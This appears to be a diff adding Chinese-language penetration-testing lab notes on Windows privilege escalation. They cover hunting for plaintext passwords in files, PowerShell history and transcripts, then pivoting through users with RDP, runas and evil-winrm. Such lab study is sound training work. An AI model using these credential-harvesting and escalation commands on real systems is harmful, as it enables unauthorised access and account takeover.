@@ -814,3 +814,345 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 ![image](https://hackmd.io/_uploads/rJP729Wcke.png)
 
 ### Hidden in Plain View
+在 meeting notes, configuration files, or onboarding documents 等等尋找敏感資訊
+
+#### 1. 尋找 sensitive information
+範例: 當在 CLIENTWK220 找到 password manager，
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc 192.168.171.220 4444      
+Microsoft Windows [Version 10.0.22621.1555]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\dave>powershell
+...
+PS C:\Users\dave> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+```
+> 在整個 C:\ 中搜尋所有符合 `.kdbx` 的檔案\
+> (KeePass 密碼資料庫檔案)
+>> 但沒有找到
+
+接著搜尋 `*.txt` 與 `*.ini` (configuration files)
+```
+PS C:\Users\dave> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+...
+Directory: C:\xampp\mysql\bin
+
+Mode                 LastWriteTime         Length Name                                               
+----                 -------------         ------ ----                                               
+-a----         6/16/2022   1:42 PM           5786 my.ini
+...
+Directory: C:\xampp
+
+Mode                 LastWriteTime         Length Name                                              
+----                 -------------         ------ ----                                                                 
+-a----         3/13/2017   4:04 AM            824 passwords.txt
+-a----         6/16/2022  10:22 AM            792 properties.ini     
+-a----         5/16/2022  12:21 AM           7498 readme_de.txt 
+-a----         5/16/2022  12:21 AM           7368 readme_en.txt     
+-a----         6/16/2022   1:17 PM           1200 xampp-control.ini
+```
+> `C:\xampp\mysql\bin\my.ini` 與 `C:\xampp\passwords.txt` 可能找到敏感資訊
+
+```
+PS C:\Users\dave> type C:\xampp\passwords.txt
+type C:\xampp\passwords.txt
+### XAMPP Default Passwords ###
+
+1) MySQL (phpMyAdmin):
+
+   User: root
+   Password:
+   (means no password!)
+...
+   Postmaster: Postmaster (postmaster@localhost)
+   Administrator: Admin (admin@localhost)
+
+   User: newuser  
+   Password: wampp 
+...
+
+PS C:\Users\dave> type C:\xampp\mysql\bin\my.ini
+type C:\xampp\mysql\bin\my.ini
+type : Access to the path 'C:\xampp\mysql\bin\my.ini' is denied.
+At line:1 char:1
++ type C:\xampp\mysql\bin\my.ini
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\xampp\mysql\bin\my.ini:String) [Get-Content], UnauthorizedAccessEx 
+   ception
+    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+```
+> `C:\xampp\passwords.txt` 僅包含未修改的XAMPP 預設密碼，且沒有權限查看 `C:\xampp\mysql\bin\my.ini` 的內容
+
+接著搜尋 User 路徑下的 `*.txt`,`*.pdf`,`*.xls`,`*.xlsx`,`*.doc`,`*.docx`:
+```
+PS C:\Users\dave> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+
+
+    Directory: C:\Users\dave\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         6/16/2022  11:28 AM            339 asdf.txt                                                             
+
+PS C:\Users\dave> cat Desktop\asdf.txt
+cat Desktop\asdf.txt
+notes from meeting:
+- Contractors won't deliver the web app on time
+- Login will be done via local user credentials
+- I need to install XAMPP and a password manager on my machine 
+- When beta app is deployed on my local pc: 
+Steve (the guy with long shirt) gives us his password for testing
+password is: securityIsNotAnOption++++++
+
+```
+> 嘗試 Steve:securityIsNotAnOption++++++ 
+
+先看 Steve 有什麼功能
+```
+PS C:\Users\dave> net user steve
+net user steve
+User name                    steve
+...
+Last logon                   6/16/2022 1:03:52 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *helpdesk             *Remote Desktop Users 
+                             *Remote Management Use*Users                
+...
+```
+> steve 不是 Administrator
+>> `* Remote Desktop Users`
+>> `* Remote Management Use`
+#### 2. 利用 sensitive information 嘗試登入
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /u:Steve /p:securityIsNotAnOption++++++ /v:192.168.171.220
+```
+![image](https://hackmd.io/_uploads/SJScos-5kl.png)
+> 成功登入 Steve
+
+查看先前 dave 無法查看的 `C:\xampp\mysql\bin\my.ini`
+```
+PS C:\Users\steve> type C:\xampp\mysql\bin\my.ini
+# Example MySQL config file for small systems.
+...
+
+# The following options will be passed to all MySQL clients
+# backupadmin Windows password for backup job
+[client]
+password       = admin123admin123!
+port=3306
+socket="C:/xampp/mysql/mysql.sock"
+```
+> 找到 Mysql pwd: `admin123admin123!`\
+> comment 說明也可能是 backupadmin 的 pwd
+
+#### 3. 查看 backupadmin 權限
+```
+PS C:\Users\steve> net user backupadmin
+User name                    BackupAdmin
+...
+
+Local Group Memberships      *Administrators       *BackupUsers
+                             *Users
+Global Group memberships     *None
+The command completed successfully.
+```
+> backupadmin 是 Administrators
+> 但不是 Remote Desktop Users 及 Remote Management Users
+> > 代表需要以其他方式存取系統
+
+>[!Important]
+> **Runas（需 GUI）:** 類似 Linux 的 sudo
+> `runas /user:backupadmin cmd.exe`\
+> 當 runas 無法使用時，其他可嘗試的方法：\
+> ![image](https://hackmd.io/_uploads/rkdC0i-qJg.png)
+> * [Log on as a batch job 說明](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/log-on-as-a-batch-job)
+
+#### 4. runas 
+```
+PS C:\WINDOWS\system32> runas /user:backupadmin cmd
+Enter the password for backupadmin:
+Attempting to start cmd as user "CLIENTWK220\backupadmin" ...
+```
+![image](https://hackmd.io/_uploads/r1Bj1hZcyl.png)
+> Once the password is entered, a new command line window appears. The title of the new window states running as CLIENTWK220\backupadmin.\
+> 成功進入 backupadmin
+
+滲透路徑 review: \
+sensitive information 👉🏻 dave 👉🏻 steve 👉🏻 (privileged) backupadmin
+
+### Information Goldmine PowerShell
+Two important logging mechanisms for PowerShell:
+* [PowerShell Transcription](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.host/start-transcript?view=powershell-7.5)\
+又稱 over-the-shoulder-transcription。啟用後，記錄的資訊就像是從旁邊觀察使用者輸入 PowerShell 。記錄的內容會被存儲在 transcript files，這些檔案通常會保存在:
+    1. 使用者的 /home 
+    2. 所有使用者共用目錄
+    3. network share collecting 的 configured machines
+
+    這樣的 record 能夠追蹤到使用者在 PowerShell 中輸入的每一個 command，對於監控系統活動非常有效。
+* [PowerShell Script Block Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2)\
+記錄執行過程中的 commands 和 blocks of script code，當一個命令或腳本區塊執行時，它會將命令的完整內容作為事件記錄下來。這比 Transcription 更廣泛，因為它會捕捉到指令的完整內容，包括編碼過的 command 或 code。
+
+以上兩個 mechanisms 在企業中越來越普遍，增加了防禦視角，但也同時提供 attackers 有價值的資訊。
+
+範例提供：enabled logging mechanisms and the PowerShell history 來取得 PowerShell 記錄的資訊
+
+#### 1. check the PowerShell history 
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc 192.168.171.220 4444 
+Microsoft Windows [Version 10.0.22621.1555]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\dave>powershell
+powershell
+...
+
+PS C:\Users\dave> Get-History
+Get-History
+
+```
+> 沒有紀錄，可能被使用者透過 `Clear-History` 指令刪除
+
+🥚 這個 Cmdlet 只會清除 user 自己的歷史記錄，可以使用 `Get-History` 截取
+>[!Important]
+> PowerShell v5、v5.1 和 v7 起，[PSReadline](https://learn.microsoft.com/en-us/powershell/module/psreadline/?view=powershell-7.5&viewFallbackFrom=powershell-7.2) 的模組 ，可以用於行編輯和命令歷史記錄。\
+> Clear-History 不會清除 PSReadline 記錄的 cmd history
+
+在 Get-PSReadlineOption module 中取用 HistorySavePath
+```
+PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath
+(Get-PSReadlineOption).HistorySavePath
+C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+PS C:\Users\dave> type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+whoami
+ls
+$PSVersionTable
+Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -VaultParameters $VaultParams
+Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
+cd C:\
+ls
+cd C:\xampp
+ls
+type passwords.txt
+Clear-History
+Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
+Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+exit
+Stop-Transcript
+```
+> 1. dave 使用模組 `SecretManagement.keepass` 執行了 Register-SecretVault，表示 dave  在 KeePass 建立了一個新的密碼管理器DB。\
+> 2. 接著 dave 使用 `Set-Secret` 在密碼管理器中建立了一個秘密或項目，名稱為 `Server02 Admin PW:paperEarMonitor33@`，可能是另一個系統的憑證。\
+> 3. 最後，dave 使用 `Start-Transcript` 啟動 PowerShell 轉錄。此 cmd 包含儲存 transcript file 的路徑 `C:\Users\Public\Transcripts\transcript01.txt`。
+    > 3.1  [`Enter-PSSession`](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2)，這是一個用來啟動遠端 PowerShell 會話的指令
+    > 3.2 使用 `-ComputerName` 參數指定本機
+    > 3.3 `-Credential` 參數來提供一個 [PSCredential](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential) 物件 $cred，該物件包含了使用者的帳號和密碼。
+> > 所以建立了一個遠端 PowerShell 會話，連接到名為 CLIENTWK220 的電腦，並使用 $cred 中的認證資訊（帳號和密碼）進行身份驗證。
+
+#### 2. 檢查有效資訊
+查看 `C:\Users\Public\Transcripts\transcript01.txt`
+```
+PS C:\Users\dave> type C:\Users\Public\Transcripts\transcript01.txt
+type C:\Users\Public\Transcripts\transcript01.txt
+**********************
+Windows PowerShell transcript start
+Start time: 20220623081143
+Username: CLIENTWK220\dave
+RunAs User: CLIENTWK220\dave
+Configuration Name: 
+Machine: CLIENTWK220 (Microsoft Windows NT 10.0.22000.0)
+Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Process ID: 10336
+PSVersion: 5.1.22000.282
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.22000.282
+BuildVersion: 10.0.22000.282
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+Transcript started, output file is C:\Users\Public\Transcripts\transcript01.txt
+PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
+PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
+PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+PS C:\Users\dave> Stop-Transcript
+**********************
+Windows PowerShell transcript end
+End time: 20220623081221
+**********************
+
+```
+> 成功發現 variable $cred
+
+#### 3. 建立 PSCredential object，偽造驗證
+首先建立一個 [SecureString](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring) 來儲存密碼，並創建 PSCredential object 來偽造 dave history 中建立的 logging mechanisms\
+(複製 Transcript 的步驟即可)
+```
+PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
+$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
+
+PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
+$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
+
+PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+
+[CLIENTWK220]: PS C:\Users\daveadmin\Documents> whoami
+whoami
+clientwk220\daveadmin
+```
+> 驗證成功後，以 daveadmin 的身份透過 WinRM 啟動 PowerShell 遠端會話
+```
+[CLIENTWK220]: PS C:\Users\daveadmin\Documents> cd C:\
+cd C:\
+
+[CLIENTWK220]: PS C:\Users\daveadmin\Documents> pwd
+pwd
+
+[CLIENTWK220]: PS C:\Users\daveadmin\Documents> dir
+dir
+```
+> 但指令沒辦法正常執行
+>> 檢查目前環境：
+>> 使用 bind shell 再透過 WinRM 建立 PowerShell 遠端會話
+>> 可能會 unexpected behavior
+
+#### 4. 使用 WinRM 連線
+在 Kali 直接使用 [evil-winrm](https://github.com/Hackplayers/evil-winrm) 透過 WinRM 連線到 CLIENTWK220
+```
+┌──(chw㉿CHW)-[~]
+└─$ evil-winrm -i 192.168.171.220 -u daveadmin -p "qwertqwertqwert123\!\!"
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\daveadmin\Documents> whoami
+clientwk220\daveadmin
+*Evil-WinRM* PS C:\Users\daveadmin\Documents> cd /
+*Evil-WinRM* PS C:\> 
+
+```
+> 成功執行 cmd
+
+>[!Caution]
+>Administrators can prevent PSReadline from recording commands by setting the -HistorySaveStyle option to SaveNothing with the [Set-PSReadlineOption](https://learn.microsoft.com/en-us/powershell/module/psreadline/set-psreadlineoption?view=powershell-7.2) Cmdlet. Alternatively, they can clear the history file manually.
+
+#### Use the Event Viewer to search for events recorded by Script Block Logging
+![image](https://hackmd.io/_uploads/r1F03pWcyl.png)
+![image](https://hackmd.io/_uploads/ByizT6bcJg.png)
+
+### Automated Enumeration
+
